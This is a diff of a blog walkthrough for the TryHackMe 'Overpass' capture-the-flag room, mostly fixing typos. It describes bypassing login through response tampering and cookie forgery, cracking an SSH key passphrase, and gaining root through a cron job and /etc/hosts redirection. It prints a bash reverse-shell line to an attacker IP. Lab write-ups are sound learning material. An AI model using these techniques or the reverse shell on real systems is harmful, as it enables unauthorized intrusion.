@@ -24,7 +24,8 @@ img {
 Here is a walkthrough of the [TryHackMe](https://tryhackme.com/) room “Overpass.” If you haven’t already completed the challenge, you can do so [here](https://tryhackme.com/room/overpass).
 >
 
-##Enumeration
+## Enumeration
+--
 
 <h3>Nmap</h3>
 
@@ -32,7 +33,7 @@ Here is a walkthrough of the [TryHackMe](https://tryhackme.com/) room “Overpas
 
 As always starting with a nmap scan.Only two 22 with SSH and 80 with Http are open.Rest are filtered.Initially no clue on SSH so moving to Enumerate Http.
 
-Simultanously starting nikto scan till then but got nothing unusual.
+Simultaneously starting nikto scan till then but got nothing unusual.
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/nikto.png)
 
@@ -40,7 +41,7 @@ Moving to the main website:-
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/website.png)
 
-This shows a normal webpage with some information about overpass password manager.There are only two pages linked with homepage which seems usual,so starting directory scan.
+This shows a normal webpage with some information about overpass password manager.There are only two pages linked with homepage which seems usual,so starting a directory scan.
 
 <h3>Dirsearch Scan</h3>
 
@@ -48,23 +49,23 @@ This shows a normal webpage with some information about overpass password manage
 
 Directory scanning showed many pages but /admin/ seems interesting.
 
-<h3>Logging In</h3>
+<h3>Logging In via Broken Authentication</h3>
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/adminpage.png)
 
-Now no clue on credentials ,also bruteforcing is not the solution as mentioned in the hint.
+Now no clue on credentials, also brute-forcing is not the solution as mentioned in the hint.
 
-So just enumerating the files assoiated with the sourcecode shows us an interseting file named login.js which contain the function used in login form on the /admin page.
+Just enumerating the files associated with the source code shows us an exciting file named login.js containing the function used in the login form on the /admin page.
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/logincode.png)
 
-The function login() in the box is the vulnerable code that will let us bypass the login form. The variable creds takes the credentials and variable response sends them to /api/login for validation and the statusOrCookie variable takes the response. Till here everything seems perfect now in the Conditional statement it checks if the response form the server is "Incorrect Credentials" then it will not allow access otherwise it will set a cookie named "SessionToken" to statusOrCookie and redirect us to admin panel. Here lies the vulnerability as user can change the response of /api/login from "Incorrect Credentials" to anything else using BurpSuite and trick the server to run the else part of the code.<br>Lets see practically:-
+The function login() in the box is the vulnerable code that will let us bypass the login form. The variable creds take the credentials, and variable response sends them to /api/login for validation, and the statusOrCookie variable takes the response. Till here, everything seems perfect now in the Conditional statement; it checks if the response from the server is "Incorrect Credentials" then it will not allow access otherwise, it will set a cookie named "SessionToken" to statusOrCookie and redirect us to the admin panel. Here lies the vulnerability as a user can change the response of /api/login from "Incorrect Credentials" to anything else using BurpSuite and trick the server into running the else part of the code.<br>Lets see practically:-
 <br>Intercepting request using burp:
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/burp1.png)
 
 
-Now as we want to change the response not the request so choosing Action > Do intersept > Response to the request
+Now, as we want to change the response, not the request so choosing Action > Do intercept > Response to the request.
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/doresponse.png)
 
@@ -79,8 +80,9 @@ Wow! we got access to the page without the credentials.
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/loggedin.png)
 
 <h3><b>BONUS</b></h3>
+--
 
-There is alternate method to login as the login.js is creating a cookie in case of successfully logging in.
+There is an alternate method to login as the login.js is creating a cookie in case of successfully logging in.
 We can manually create the cookie on the login page named "SessionToken" and assign it any value as there is no code to validate our cookie.
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/cookie.png)
@@ -99,12 +101,12 @@ Saving the Key to a file and reduce its permission using ```chmod 400 james.key 
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/ssh_fail.png)
 
-OHH!! It is asking for the passphase for the provided key. As No passphase is found.Now bruteforing is the only option.
-using <b>ssh2john.py</b> to conver to hash that john can crack using rockyou.txt
+OHH!! It is asking for the passphrase for the provided key. As No passphrase is found.Now bruteforing is the only option.
+using <b>ssh2john.py</b> to convert to hash that john can crack using rockyou.txt
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/johncrack.png)
 
-It successfully found the passphase that is <b>james13</b>. Now we can log in via SSH.
+It successfully found the passphrase that is <b>james13</b>. Now we can log in via SSH.
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/james_ssh_success.png)
 
@@ -115,12 +117,12 @@ Get the user flag and submit.
 
 <h3>Privilege Escalation</h3>
 
-This part is really interseting as none of the manual methods worked.
+This part is really interesting as none of the manual methods worked.
 ``` 
 	1.Can't run sudo -l as don't know james password.
 	2.SUID bit can be cheched by "find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null " but are also not intersting.
 ```
-Using automated Tools like linpeas.sh intially not helped untill I saw the room tag mentioned "cron".
+Using automated Tools like linpeas.sh initially not helped until I saw the room tag mentioned "cron".
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/root_curl.png)
 
@@ -140,13 +142,13 @@ Lets do this practically:
 	3. Finally a file named buildscript.sh with the reverse shell , i used it from pentestermonkey.net "bash -i >& /dev/tcp/10.9.19.190/1234 0>&1"
 	4.Now start a netcat listener locally to which the Box will connect.
 	5. At last replace the IP of the /etc/hosts of overpass.thm to our own connecting IP.
-	6. All done now wait a few seconds till it connects back to us via nc listner due to cronjob assigned.
+	6. All done now wait a few seconds till it connects back to us via nc listener due to cronjob assigned.
 
 ```
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/flag2.png)
 
-Finally we got a connection from the Box as ROOT
+Finally, We got a connection from the Box as ROOT. It was really a nice room containing many fundamentals,an I enjoyed soving it and writing its walkthrough.
 
 
 
